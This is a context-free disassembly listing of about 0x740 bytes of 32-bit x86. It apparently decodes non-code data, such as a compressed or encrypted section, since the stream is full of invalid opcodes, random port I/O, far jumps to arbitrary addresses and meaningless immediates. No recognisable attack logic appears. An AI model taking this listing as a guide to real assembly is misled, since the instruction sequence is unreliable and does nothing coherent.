  40dfb9:	fucomi st,st(2)
  40dfbb:	cld    
  40dfbc:	shl    BYTE PTR [ebx-0x49c59362],cl
  40dfc2:	ficom  DWORD PTR [edx+0x42]
  40dfc5:	push   ds
  40dfc6:	mov    cl,0x32
  40dfc8:	das    
  40dfc9:	mov    edi,0x1e8234ad
  40dfce:	test   DWORD PTR [edi],ebp
  40dfd0:	mov    ds:0xedc9ed8d,eax
  40dfd5:	dec    ecx
  40dfd6:	(bad)  [esi+0x7f046435]
  40dfdc:	mov    esp,0xd29644f9
  40dfe1:	dec    edx
  40dfe2:	fwait
  40dfe3:	pop    ebx
  40dfe4:	mov    bl,0x9
  40dfe6:	aas    
  40dfe7:	mov    bh,0x75
  40dfe9:	sbb    eax,0x97d556ad
  40dfee:	out    dx,al
  40dfef:	sub    DWORD PTR cs:[esi],esi
  40dff2:	pushf  
  40dff3:	js     0x40dfc7
  40dff5:	scas   al,BYTE PTR es:[edi]
  40dff6:	sbb    esi,edx
  40dff8:	or     al,0x5b
  40dffa:	pop    ss
  40dffb:	test   eax,0x6c8ec57d
  40e001:	mov    esp,0xfdd63c9b
  40e006:	sbb    cl,BYTE PTR [edx]
  40e008:	out    0xeb,eax
  40e00a:	adc    DWORD PTR [esi+0x1b98b070],ecx
  40e010:	loope  0x40e056
  40e012:	lea    ecx,[esi+0x6cc1611e]
  40e018:	sub    edi,DWORD PTR [eax+0x358c0106]
  40e01e:	test   ebp,esi
  40e020:	psubb  mm7,mm0
  40e023:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e024:	lods   al,BYTE PTR ds:[esi]
  40e025:	cmp    al,BYTE PTR [ebx-0x72]
  40e028:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e029:	jo     0x40e06a
  40e02b:	iret   
  40e02c:	aam    0xe1
  40e02e:	push   0x50
  40e030:	rol    BYTE PTR [edx-0x5e],cl
  40e033:	pop    edx
  40e034:	inc    edx
  40e035:	xor    ebp,ecx
  40e037:	and    BYTE PTR [esi],dh
  40e039:	adc    BYTE PTR [ebx+esi*4+0x11],dh
  40e03d:	jp     0x40e096
  40e03f:	arpl   WORD PTR [ecx-0x62],bx
  40e042:	or     DWORD PTR [esi],ecx
  40e044:	pop    ebx
  40e045:	mov    eax,DWORD PTR [esp+eax*8+0x1145eed7]
  40e04c:	inc    edx
  40e04d:	icebp  
  40e04e:	jg     0x40e0b4
  40e050:	mov    cl,0x11
  40e052:	jecxz  0x40e06b
  40e054:	in     al,dx
  40e055:	pop    edi
  40e056:	cmp    BYTE PTR [eax],al
  40e058:	call   eax
  40e05a:	mov    ch,bh
  40e05c:	test   al,0x61
  40e05e:	add    edi,DWORD PTR [esi+ecx*4]
  40e061:	popa   
  40e062:	out    0xee,al
  40e064:	icebp  
  40e065:	sbb    al,0xe4
  40e067:	mov    ah,0x68
  40e069:	adc    eax,DWORD PTR [edx]
  40e06b:	aaa    
  40e06c:	adc    BYTE PTR [ecx+0x5b72108a],ah
  40e072:	test   BYTE PTR [eax-0x1d],dl
  40e075:	or     edx,esi
  40e077:	mov    al,0x44
  40e079:	scas   al,BYTE PTR es:[edi]
  40e07a:	(bad)  
  40e07b:	mov    fs,ebp
  40e07d:	sbb    BYTE PTR [ebp+0xb1c5493],bl
  40e083:	inc    al
  40e085:	and    al,0x31
  40e087:	popf   
  40e088:	adc    al,BYTE PTR [esi-0x9]
  40e08b:	les    edx,FWORD PTR [ebx+0x218ea4e1]
  40e091:	xchg   BYTE PTR [eax],dh
  40e093:	push   edx
  40e094:	repnz add eax,0xfd26aff
  40e09a:	cmp    ch,BYTE PTR [ebx+0x28]
  40e09d:	fwait
  40e09e:	mov    eax,ds:0x861ccd72
  40e0a3:	lahf   
  40e0a4:	ins    DWORD PTR es:[edi],dx
  40e0a5:	inc    eax
  40e0a6:	pop    ebx
  40e0a7:	sahf   
  40e0a8:	lea    edx,[ebp-0x75]
  40e0ab:	in     al,0xd2
  40e0ad:	pop    edx
  40e0ae:	test   al,0x32
  40e0b0:	or     al,dl
  40e0b2:	xchg   ecx,eax
  40e0b3:	into   
  40e0b4:	or     al,0x3
  40e0b6:	pusha  
  40e0b7:	dec    edx
  40e0b8:	(bad)  
  40e0b9:	pop    esi
  40e0ba:	call   0xd24f:0x564a4200
  40e0c1:	jae    0x40e0a2
  40e0c3:	sbb    dl,ch
  40e0c5:	cmp    BYTE PTR [eax],ch
  40e0c7:	jge    0x40e07d
  40e0c9:	adc    DWORD PTR [ecx-0x12],esp
  40e0cc:	inc    edi
  40e0cd:	push   esi
  40e0ce:	mov    bh,0x94
  40e0d0:	jns    0x40e052
  40e0d2:	test   DWORD PTR ds:0x6d981af,edi
  40e0d8:	sub    ch,ah
  40e0da:	dec    BYTE PTR [esi+0x52044aa]
  40e0e0:	pop    ebx
  40e0e1:	into   
  40e0e2:	iret   
  40e0e3:	mov    edx,0xd8d52fd2
  40e0e8:	sub    esp,DWORD PTR [edi]
  40e0ea:	adc    al,0x84
  40e0ec:	imul   ebp,esi,0xffffffdb
  40e0ef:	mov    ss,WORD PTR [edi-0x5c]
  40e0f2:	pushf  
  40e0f3:	pop    ebx
  40e0f4:	xchg   esi,eax
  40e0f5:	mov    al,ds:0x96d22991
  40e0fa:	fisub  DWORD PTR [eax-0xb6472e4]
  40e100:	inc    ebx
  40e101:	push   ds
  40e102:	mov    al,ds:0xe71c4c8a
  40e107:	in     eax,dx
  40e108:	pop    ebp
  40e109:	and    al,0x81
  40e10b:	sub    ecx,DWORD PTR [ebx]
  40e10d:	xchg   BYTE PTR [ebp-0x19],al
  40e110:	ins    DWORD PTR es:[edi],dx
  40e111:	add    al,0x9d
  40e113:	out    dx,al
  40e114:	retf   
  40e115:	xor    BYTE PTR [edx+0x46],al
  40e118:	into   
  40e119:	mov    al,ds:0xed7be88a
  40e11e:	push   ecx
  40e11f:	bound  esp,QWORD PTR [esi-0x2d03a4a7]
  40e125:	adc    ah,BYTE PTR [edi+0x61]
  40e128:	mov    ds:0x4d0b8f45,al
  40e12d:	add    bh,ch
  40e12f:	or     al,0x77
  40e131:	int    0x4e
  40e133:	push   ds
  40e134:	mov    al,0xf0
  40e136:	test   DWORD PTR [ebp+0x3e],ebx
  40e139:	sahf   
  40e13a:	(bad)  
  40e13b:	mov    ah,0x7
  40e13d:	fst    DWORD PTR [ebx]
  40e13f:	(bad)  
  40e140:	mov    esp,0x8f53c204
  40e145:	adc    DWORD PTR [eax],ecx
  40e147:	pop    ecx
  40e148:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e149:	push   ecx
  40e14a:	pop    edi
  40e14b:	pop    es
  40e14c:	in     al,0xf2
  40e14e:	adc    eax,0x946e728e
  40e153:	leave  
  40e154:	sbb    ecx,DWORD PTR [ecx+0x44bc8e03]
  40e15a:	sub    esi,edx
  40e15c:	fstp   DWORD PTR ds:0xd236
  40e161:	sbb    BYTE PTR [edi-0x52],al
  40e164:	dec    ebx
  40e165:	jecxz  0x40e177
  40e167:	push   eax
  40e168:	add    dl,BYTE PTR [ecx]
  40e16a:	mov    ds:0x9fe559d,al
  40e16f:	sbb    DWORD PTR [ebx-0x66dd7bf8],ecx
  40e175:	and    edi,DWORD PTR [edi-0x1a]
  40e178:	retf   0x90bd
  40e17b:	cwde   
  40e17c:	enter  0x12da,0xc3
  40e180:	adc    al,al
  40e182:	fiadd  WORD PTR ds:0xa68531ad
  40e188:	test   eax,0x68479f20
  40e18d:	xor    ah,dh
  40e18f:	mov    ?,ecx
  40e191:	sbb    eax,DWORD PTR [eax]
  40e193:	arpl   WORD PTR [esi-0xd],bx
  40e196:	sbb    eax,0x84083df0
  40e19b:	std    
  40e19c:	pushaw 
  40e19e:	or     eax,0xe13e6e8
  40e1a3:	mov    cs,esi
  40e1a5:	and    esi,eax
  40e1a7:	mov    ebx,0x9d61f986
  40e1ac:	test   eax,0x6d526210
  40e1b1:	test   DWORD PTR [ebp-0x9cd36b3],edx
  40e1b7:	mov    ?,WORD PTR [ecx-0x32]
  40e1ba:	mov    edx,0xd2122094
  40e1bf:	pop    esi
  40e1c0:	lods   eax,DWORD PTR ds:[esi]
  40e1c1:	and    al,BYTE PTR [edx+0x19]
  40e1c4:	xchg   DWORD PTR [edi],esp
  40e1c6:	xchg   DWORD PTR ds:0xd759007a,ecx
  40e1cc:	adc    BYTE PTR [ecx],0xa9
  40e1cf:	sbb    eax,0xdae7b84b
  40e1d4:	mov    BYTE PTR [eax-0x17],dh
  40e1d7:	sbb    DWORD PTR [ebp+0x15],esi
  40e1da:	inc    ebp
  40e1db:	(bad)  [eax+esi*8]
  40e1de:	mov    ah,0xb4
  40e1e0:	(bad)  
  40e1e1:	adc    edx,DWORD PTR [ecx]
  40e1e3:	cli    
  40e1e4:	inc    eax
  40e1e5:	loope  0x40e1f7
  40e1e7:	cwde   
  40e1e8:	adc    dl,BYTE PTR [edi-0x7e2defbc]
  40e1ee:	xor    DWORD PTR [ebp+0x480ae80b],esp
  40e1f4:	mov    WORD PTR [ecx],ss
  40e1f6:	or     DWORD PTR [ebx+ebx*4-0x29fdf7ff],ebx
  40e1fd:	mov    al,ds:0x91f8fd8d
  40e202:	sbb    bl,BYTE PTR [edx-0x78]
  40e205:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e206:	leave  
  40e207:	sbb    cl,cl
  40e209:	adc    DWORD PTR [edx-0x26a244e4],esi
  40e20f:	clc    
  40e210:	cmp    eax,DWORD PTR [ecx]
  40e212:	test   DWORD PTR [esi],ebx
  40e214:	dec    edi
  40e215:	jecxz  0x40e214
  40e217:	gs mov ebp,0x5f8e94a4
  40e21d:	xchg   edx,eax
  40e21e:	dec    edi
  40e21f:	iret   
  40e220:	aaa    
  40e221:	int3   
  40e222:	mov    bl,0xc8
  40e224:	sar    BYTE PTR [ecx+0x4],cl
  40e227:	(bad)  
  40e228:	xlat   BYTE PTR ds:[ebx]
  40e229:	cmp    al,0x73
  40e22b:	outs   dx,BYTE PTR ds:[esi]
  40e22c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e22d:	adc    DWORD PTR [ecx+0xf9a158c],edx
  40e233:	dec    ebp
  40e234:	sub    al,0x93
  40e236:	test   DWORD PTR [ebx+0x4c],edx
  40e239:	xchg   edi,eax
  40e23a:	pop    es
  40e23b:	xchg   esp,eax
  40e23c:	cmp    ebp,DWORD PTR [ecx-0x3e3371a1]
  40e242:	mov    eax,ds:0x7c06f861
  40e247:	fsubrp st(5),st
  40e249:	in     al,0x3
  40e24b:	in     eax,0xa4
  40e24d:	ret    0xf285
  40e250:	loopne 0x40e200
  40e252:	ja     0x40e27c
  40e254:	das    
  40e255:	in     al,0x84
  40e257:	mov    ?,WORD PTR [edi-0x1e21bb67]
  40e25d:	mov    bl,0x45
  40e25f:	mov    edx,edx
  40e261:	pop    edi
  40e262:	mov    edx,ebx
  40e264:	shl    ebx,0x37
  40e267:	add    al,0x3f
  40e269:	adc    edx,edi
  40e26b:	sub    DWORD PTR [ecx-0x4],esi
  40e26e:	mov    WORD PTR [edi+0x3dd52abd],fs
  40e274:	mov    dl,0x9
  40e276:	lock xor ch,BYTE PTR [edi-0xc]
  40e27a:	mov    ebx,0x37c4978e
  40e27f:	mov    ds:0x8da378fa,al
  40e284:	push   eax
  40e285:	out    0x4a,eax
  40e287:	inc    edi
  40e288:	jg     0x40e272
  40e28a:	es ret 0xc1ba
  40e28e:	test   ebp,edx
  40e290:	push   0x43
  40e292:	icebp  
  40e293:	dec    ecx
  40e294:	jns    0x40e2b2
  40e296:	or     BYTE PTR [esi+0x50ab9c65],0xac
  40e29d:	jp     0x40e315
  40e29f:	push   es
  40e2a0:	shl    dh,cl
  40e2a2:	ret    
  40e2a3:	lea    ebx,[ebx+0x8]
  40e2a6:	ja     0x40e2d7
  40e2a8:	test   DWORD PTR [ecx],edx
  40e2aa:	cdq    
  40e2ab:	inc    esp
  40e2ac:	jmp    0x40e302
  40e2ae:	mov    esi,0xff64dba6
  40e2b3:	inc    esi
  40e2b4:	ret    
  40e2b5:	(bad)  
  40e2b6:	sbb    ch,BYTE PTR [esi]
  40e2b8:	mov    ebx,ecx
  40e2ba:	call   0x155f0bfb
  40e2bf:	xor    eax,0xa89c313a
  40e2c4:	push   ss
  40e2c5:	fwait
  40e2c6:	test   ebx,edi
  40e2c8:	pop    ebx
  40e2c9:	adc    bl,BYTE PTR [edx-0x27c74d32]
  40e2cf:	xchg   DWORD PTR [edi-0x43],ebx
  40e2d2:	mov    ecx,DWORD PTR [esi-0x3ce309c0]
  40e2d8:	and    DWORD PTR [edx+0x1131c73d],eax
  40e2de:	xlat   BYTE PTR ds:[ebx]
  40e2df:	jg     0x40e33e
  40e2e1:	bound  edi,QWORD PTR [esi-0x36e1b70c]
  40e2e7:	mov    DWORD PTR [ebp-0x2c77e3cf],edi
  40e2ed:	lods   eax,DWORD PTR ds:[esi]
  40e2ee:	test   DWORD PTR [esi],esi
  40e2f0:	cmp    eax,0xeda54429
  40e2f5:	stos   BYTE PTR es:[edi],al
  40e2f6:	iret   
  40e2f7:	cwde   
  40e2f8:	mov    esi,0x9c50ef09
  40e2fd:	adc    ebp,DWORD PTR [ecx-0x3a718689]
  40e303:	jnp    0x40e306
  40e305:	fadd   DWORD PTR [eax+0x508e1e07]
  40e30b:	dec    esi
  40e30c:	pop    ebx
  40e30d:	sub    ah,BYTE PTR [eax+0x26]
  40e310:	std    
  40e311:	adc    DWORD PTR [ecx-0x35],ecx
  40e314:	cmp    al,0xdb
  40e316:	fimul  WORD PTR [esi-0x4]
  40e319:	mov    esi,0xdfc31f85
  40e31e:	das    
  40e31f:	cmc    
  40e320:	iret   
  40e321:	pusha  
  40e322:	ror    DWORD PTR [esi-0x25c05e6d],cl
  40e328:	mov    esp,0xad215ed0
  40e32d:	xor    cl,BYTE PTR [esi]
  40e32f:	dec    ecx
  40e330:	pop    ds
  40e331:	xor    DWORD PTR [edx+0x36],ebp
  40e334:	xor    BYTE PTR [ebx],al
  40e336:	call   0x39bb07c9
  40e33b:	or     BYTE PTR [eax+0x65],al
  40e33e:	in     al,dx
  40e33f:	daa    
  40e340:	rol    BYTE PTR [edi],cl
  40e342:	xor    esp,esp
  40e344:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e345:	fadd   QWORD PTR [ebp-0x3]
  40e348:	push   cs
  40e349:	adc    DWORD PTR [eax-0x3e],edi
  40e34c:	out    dx,eax
  40e34d:	test   DWORD PTR [ebp-0x7ba72268],ecx
  40e353:	inc    ebx
  40e354:	dec    DWORD PTR [eax]
  40e356:	jo     0x40e335
  40e358:	or     ebp,ebx
  40e35a:	push   ds
  40e35b:	mov    ?,WORD PTR [edi+eiz*2]
  40e35e:	or     ebx,eax
  40e360:	clc    
  40e361:	xor    eax,DWORD PTR [eax]
  40e363:	outs   dx,DWORD PTR ds:[esi]
  40e364:	scas   eax,DWORD PTR es:[edi]
  40e365:	jno    0x40e33b
  40e367:	loopne 0x40e2f7
  40e369:	jmp    0x5886a7f6
  40e36e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e36f:	push   cs
  40e370:	push   0xfffffff0
  40e372:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e373:	mov    ds,WORD PTR [edx-0x1c]
  40e376:	and    al,0xd6
  40e378:	or     eax,0xa6715d5
  40e37d:	add    DWORD PTR [eax-0x73f16061],edi
  40e383:	enter  0x37d2,0xd
  40e387:	adc    eax,0x8e70a485
  40e38c:	mov    al,ds:0xf10cc1bd
  40e391:	push   ss
  40e392:	call   0xab04b62a
  40e397:	push   eax
  40e398:	sbb    eax,0x88b3ec3a
  40e39d:	adc    ebp,eax
  40e39f:	mov    al,BYTE PTR [edx+ebx*8-0x1950571f]
  40e3a6:	adc    BYTE PTR [esi-0x16],0xcb
  40e3aa:	ja     0x40e33a
  40e3ac:	pop    esi
  40e3ad:	call   0x11591647
  40e3b2:	cs pop ecx
  40e3b5:	xchg   edi,eax
  40e3b6:	push   es
  40e3b7:	lock fst DWORD PTR [edi-0x7c]
  40e3bb:	ins    DWORD PTR es:[edi],dx
  40e3bc:	outs   dx,DWORD PTR ds:[esi]
  40e3bd:	iret   
  40e3be:	repz inc ecx
  40e3c0:	sub    dh,cl
  40e3c2:	mov    cl,0x8d
  40e3c4:	cmp    al,0xf3
  40e3c6:	test   al,0xa1
  40e3c8:	addr16 dec ebp
  40e3ca:	test   al,0xde
  40e3cc:	adc    bh,ah
  40e3ce:	test   DWORD PTR [ebx],esi
  40e3d0:	popa   
  40e3d1:	and    al,0xbb
  40e3d4:	jae    0x40e38c
  40e3d6:	jbe    0x40e366
  40e3d8:	je     0x40e444
  40e3da:	ins    DWORD PTR es:[edi],dx
  40e3db:	mov    bh,BYTE PTR [ebx+0x2510d4d5]
  40e3e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3e2:	mov    cl,BYTE PTR [eax]
  40e3e4:	push   esi
  40e3e5:	and    ebp,DWORD PTR [eax-0x424a7cec]
  40e3eb:	sbb    al,0x3
  40e3ed:	jecxz  0x40e407
  40e3ef:	mov    gs,WORD PTR [esp+edi*2-0x3]
  40e3f3:	mov    al,ds:0xfcb5cb1
  40e3f8:	ror    BYTE PTR [ecx],cl
  40e3fa:	pop    ecx
  40e3fb:	ror    ecx,cl
  40e3fd:	sbb    ch,BYTE PTR [eax+0x4d26fbab]
  40e403:	jns    0x40e457
  40e405:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e406:	xchg   DWORD PTR [esi],edi
  40e408:	mov    eax,ds:0xd2b8bc5d
  40e40d:	test   al,0xf3
  40e40f:	pusha  
  40e410:	test   edx,esp
  40e412:	scas   eax,DWORD PTR es:[edi]
  40e413:	push   ebp
  40e414:	pop    ss
  40e415:	adc    DWORD PTR [edx],edx
  40e417:	mov    bl,0xba
  40e419:	pop    fs
  40e41b:	mov    esi,ss
  40e41d:	cmp    DWORD PTR [ebp-0x44404e6e],eax
  40e423:	add    eax,0x8d2e53bb
  40e428:	neg    BYTE PTR [ebx+eax*2-0x7604cae7]
  40e42f:	cmp    al,0xd2
  40e431:	or     DWORD PTR [edi+0x16],esp
  40e434:	and    dl,bl
  40e436:	mul    DWORD PTR ds:[eax+0x1e]
  40e43a:	or     ecx,DWORD PTR [edx]
  40e43c:	fwait
  40e43d:	test   al,0x93
  40e43f:	(bad)  
  40e440:	lods   al,BYTE PTR ds:[esi]
  40e441:	(bad)  
  40e442:	test   DWORD PTR [ebx+0xb],esi
  40e445:	jmp    0x8e60:0x26400547
  40e44c:	xlat   BYTE PTR ds:[ebx]
  40e44d:	int3   
  40e44e:	and    eax,0xbb591325
  40e453:	rcl    edx,0x5b
  40e456:	xor    BYTE PTR [esi+0x1c879c4c],bh
  40e45c:	mov    esp,0x908e88e0
  40e461:	(bad)  
  40e462:	cld    
  40e463:	es add eax,0xd3d01f02
  40e469:	push   ds
  40e46a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e46b:	not    DWORD PTR [edx-0x59d4e262]
  40e471:	cmp    al,0xa3
  40e473:	mov    gs,ebx
  40e475:	jp     0x40e455
  40e477:	mov    WORD PTR [esi-0x52aa7c81],es
  40e47d:	lea    edi,[ecx+0x68dce2ea]
  40e483:	push   ss
  40e484:	push   edx
  40e485:	aas    
  40e486:	mov    dh,0x89
  40e488:	dec    ebx
  40e489:	loope  0x40e474
  40e48b:	dec    esi
  40e48c:	cmp    DWORD PTR [ebx+0x26],ecx
  40e48f:	outs   dx,DWORD PTR ds:[esi]
  40e490:	repnz mov dl,0x85
  40e493:	dec    edi
  40e494:	sbb    al,0xaf
  40e496:	xchg   ecx,eax
  40e497:	dec    esi
  40e498:	mov    esp,DWORD PTR [eax+0x1e16ece4]
  40e49e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e49f:	adc    eax,0x7acfb87c
  40e4a4:	xor    DWORD PTR [ebp-0x37],eax
  40e4a7:	lahf   
  40e4a8:	sar    cl,cl
  40e4aa:	add    BYTE PTR [edi],0x17
  40e4ad:	add    DWORD PTR [ebx+0x1e],ecx
  40e4b0:	or     DWORD PTR [ecx],edx
  40e4b2:	push   es
  40e4b3:	out    dx,eax
  40e4b4:	into   
  40e4b5:	shr    BYTE PTR [ecx+0x64],0xb8
  40e4b9:	inc    ecx
  40e4ba:	mul    BYTE PTR [edx]
  40e4bc:	xchg   edx,eax
  40e4bd:	std    
  40e4be:	test   DWORD PTR [ebp+0x29b3794],ecx
  40e4c4:	dec    eax
  40e4c5:	adc    DWORD PTR [eax],ecx
  40e4c7:	push   es
  40e4c8:	(bad)  
  40e4c9:	lock xor ecx,DWORD PTR [edi+0x217e5cba]
  40e4d0:	rcr    BYTE PTR [esi-0x4e9a15b1],cl
  40e4d6:	(bad)  
  40e4d7:	je     0x40e4e8
  40e4d9:	add    al,al
  40e4db:	test   BYTE PTR ds:0xc69f5f7f,bh
  40e4e1:	xchg   DWORD PTR [ebp+0x79],eax
  40e4e4:	outs   dx,DWORD PTR ds:[esi]
  40e4e5:	lods   al,BYTE PTR ds:[esi]
  40e4e6:	nop
  40e4e7:	jmp    0x8d471ed1
  40e4ec:	jbe    0x40e470
  40e4ee:	xor    eax,DWORD PTR [edx]
  40e4f0:	mov    esi,0xd0315deb
  40e4f5:	push   ds
  40e4f6:	mov    esi,0x5b1c6e83
  40e4fb:	pop    es
  40e4fc:	pop    ebx
  40e4fd:	pop    edi
  40e4fe:	es mov esi,0xd5844a26
  40e504:	mov    edx,0x6bd971f4
  40e509:	mov    al,0x5
  40e50b:	xchg   edi,eax
  40e50c:	push   esp
  40e50d:	les    ebx,FWORD PTR [edx]
  40e50f:	fwait
  40e510:	push   ds
  40e511:	loope  0x40e547
  40e513:	imul   esp,DWORD PTR ds:0xc9dfecd2,0x59
  40e51a:	test   ah,cl
  40e51c:	push   ebp
  40e51d:	(bad)  
  40e51f:	jb     0x40e4a7
  40e521:	outs   dx,DWORD PTR ds:[esi]
  40e522:	push   ecx
  40e523:	test   al,0xc8
  40e525:	sbb    eax,DWORD PTR [esi-0x1c29f30]
  40e52b:	push   cs
  40e52c:	pop    edx
  40e52d:	sahf   
  40e52e:	fnstsw WORD PTR [esi-0x2f]
  40e531:	mov    bl,0xa3
  40e533:	jo     0x40e4dd
  40e535:	icebp  
  40e536:	lock fiadd WORD PTR [esi+edi*8-0x6d77199]
  40e53e:	retf   0x752e
  40e541:	clc    
  40e542:	mov    al,0xf1
  40e544:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e545:	mov    bl,0x85
  40e547:	mov    eax,ds:0xfa78adab
  40e54c:	neg    BYTE PTR [edx]
  40e54e:	or     BYTE PTR [esi-0x7ae1ec52],0x6e
  40e555:	jae    0x40e538
  40e557:	xchg   edi,eax
  40e558:	push   0xffffffac
  40e55a:	test   ebx,eax
  40e55c:	jmp    0x40e4ff
  40e55e:	sbb    BYTE PTR [edi+0x6],ch
  40e561:	jle    0x40e59a
  40e563:	(bad)  
  40e564:	retf   0x6177
  40e567:	out    0x40,al
  40e569:	mov    ds:0xf6d288d6,eax
  40e56e:	sbb    al,0xf9
  40e570:	fcomp  DWORD PTR [eax]
  40e572:	mov    dl,0x3e
  40e574:	and    eax,ebp
  40e576:	xor    DWORD PTR [esi-0x2e],esi
  40e579:	xor    al,BYTE PTR [ecx]
  40e57b:	push   eax
  40e57c:	and    eax,0xc610b6bc
  40e581:	sub    al,0xcc
  40e583:	mov    bl,0xd2
  40e585:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e586:	jmp    0x4b8e:0xac8c380a
  40e58d:	into   
  40e58e:	retf   
  40e58f:	inc    eax
  40e590:	frstor [eax-0x542d78d2]
  40e596:	and    DWORD PTR [edi-0x52d8165f],esi
  40e59c:	sbb    esp,DWORD PTR [esi]
  40e59e:	and    eax,0xb3aad2f0
  40e5a3:	scas   eax,DWORD PTR es:[edi]
  40e5a4:	repnz ficomp DWORD PTR [edi]
  40e5a7:	and    dl,bl
  40e5a9:	mov    BYTE PTR [ecx+0x62],cl
  40e5ac:	shl    ecx,1
  40e5ae:	out    dx,eax
  40e5af:	stc    
  40e5b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5b1:	sbb    DWORD PTR [esi-0x72],esi
  40e5b4:	ret    0xca6d
  40e5b7:	je     0x40e623
  40e5b9:	xor    BYTE PTR [ecx-0x36],0xd2
  40e5bd:	mov    eax,ds:0x950e7cb9
  40e5c2:	jge    0x40e573
  40e5c4:	push   ecx
  40e5c5:	jmp    0xe711:0xe70192f9
  40e5cc:	lods   al,BYTE PTR ds:[esi]
  40e5cd:	xchg   ecx,eax
  40e5ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5cf:	adc    al,0xe0
  40e5d1:	pop    ecx
  40e5d2:	test   BYTE PTR [ebx-0x7d1a24b1],dh
  40e5d8:	mov    ebx,0x6babda48
  40e5dd:	hlt    
  40e5de:	test   DWORD PTR [edx+0x769e62db],edx
  40e5e4:	adc    eax,0x889a8e23
  40e5e9:	xchg   ecx,eax
  40e5ea:	or     al,0xba
  40e5ec:	mov    al,0x69
  40e5ee:	popa   
  40e5ef:	nop
  40e5f0:	fcomp  DWORD PTR ds:0xdfa783db
  40e5f6:	dec    esp
  40e5f7:	into   
  40e5f8:	push   eax
  40e5f9:	cs cmc 
  40e5fb:	inc    esp
  40e5fc:	loope  0x40e59c
  40e5fe:	mov    ?,WORD PTR [di+0x71]
  40e602:	mov    ah,0xfc
  40e604:	test   BYTE PTR [ebx],dl
  40e606:	or     al,0xe2
  40e608:	ins    BYTE PTR es:[edi],dx
  40e609:	push   ds
  40e60a:	xor    bl,BYTE PTR [esi-0xfef6eaf]
  40e610:	sbb    eax,DWORD PTR [edx]
  40e612:	test   esp,ebp
  40e614:	mov    edx,0x8b73ca86
  40e619:	sub    ebx,DWORD PTR [eax+0x1511ea66]
  40e61f:	(bad)  
  40e620:	aaa    
  40e621:	mov    bl,0x82
  40e623:	ret    
  40e624:	add    eax,0xeb570de2
  40e629:	in     eax,0xdb
  40e62b:	mov    BYTE PTR [ebx-0x2c],cl
  40e62e:	inc    ebp
  40e62f:	xor    dl,BYTE PTR [ecx]
  40e631:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e632:	jmp    0xed3c:0x8314d6c6
  40e639:	push   edi
  40e63a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e63b:	adc    esp,eax
  40e63d:	test   DWORD PTR [ecx-0x1],ebx
  40e640:	scas   al,BYTE PTR es:[edi]
  40e641:	pop    ss
  40e642:	lock mov esi,0xd3453993
  40e648:	fdivr  QWORD PTR [edx-0x18ea71f4]
  40e64e:	mov    bh,0xa0
  40e650:	inc    eax
  40e651:	shl    ch,cl
  40e653:	mov    cl,0xe6
  40e655:	xor    dl,BYTE PTR [edx+0x6f]
  40e658:	lods   eax,DWORD PTR ds:[esi]
  40e659:	push   es
  40e65a:	cmp    edi,DWORD PTR [eax+0x6b]
  40e65d:	mul    BYTE PTR [ebp+0xe]
  40e660:	add    al,BYTE PTR [edx]
  40e662:	pop    ecx
  40e663:	mov    gs,WORD PTR [ecx]
  40e665:	push   ss
  40e666:	jl     0x40e6cd
  40e668:	das    
  40e669:	xlat   BYTE PTR ds:[ebx]
  40e66a:	neg    bh
  40e66c:	fcmovne st,st(6)
  40e66e:	mov    ch,0x3a
  40e670:	adc    DWORD PTR [ebx+ecx*2-0x74eac7b2],edx
  40e677:	fimul  WORD PTR [edx+0x1e]
  40e67a:	dec    ebp
  40e67b:	xchg   ebp,edi
  40e67d:	mov    bh,0x90
  40e67f:	aam    0x6e
  40e681:	cwde   
  40e682:	mov    bh,ah
  40e684:	push   ss
  40e685:	sub    eax,DWORD PTR [esi]
  40e687:	sti    
  40e688:	enter  0xe457,0x31
  40e68c:	sti    
  40e68d:	push   ds
  40e68e:	jns    0x40e68a
  40e690:	out    dx,al
  40e691:	loop   0x40e6ce
  40e693:	std    
  40e694:	jg     0x40e6eb
  40e696:	and    al,0x75
  40e698:	cli    
  40e699:	xor    BYTE PTR [edx+edx*1-0x42c8ee51],cl
  40e6a0:	and    eax,0x67c729f0
  40e6a5:	push   ds
  40e6a6:	aam    0xe9
  40e6a8:	adc    al,0x7d
  40e6aa:	pop    ebx
  40e6ab:	sub    al,0xa0
  40e6ad:	push   ebx
  40e6ae:	test   al,bl
  40e6b0:	ficomp DWORD PTR [ebx]
  40e6b2:	in     al,0x70
  40e6b4:	lods   eax,DWORD PTR ds:[esi]
  40e6b5:	outs   dx,DWORD PTR ds:[esi]
  40e6b6:	lea    ebx,cs:[esi*8-0x5d4e21a5]
  40e6be:	(bad)  
  40e6bf:	cli    
  40e6c0:	mov    esi,0xd208d060
  40e6c5:	in     al,0x10
  40e6c7:	ret    
  40e6c8:	jp     0x40e6f8
  40e6ca:	int    0x79
  40e6cc:	adc    al,0x1e
  40e6ce:	popf   
  40e6cf:	iret   
  40e6d0:	adc    ch,BYTE PTR [eax-0x4f]
  40e6d3:	(bad)  
  40e6d4:	ja     0x40e728
  40e6d6:	repnz lds ebp,FWORD PTR [ecx+0x4f22ff75]
  40e6dd:	or     al,BYTE PTR [ebp-0x60a09983]
  40e6e3:	mov    fs,WORD PTR [eax]
  40e6e5:	adc    edx,eax
  40e6e7:	push   ecx
  40e6e8:	retf   0x60e4
  40e6eb:	fcmovnbe st,st(2)
  40e6ed:	cmp    edi,DWORD PTR ds:0xcb8d1284
  40e6f3:	cmp    al,0xb6
  40e6f5:	adc    esp,eax
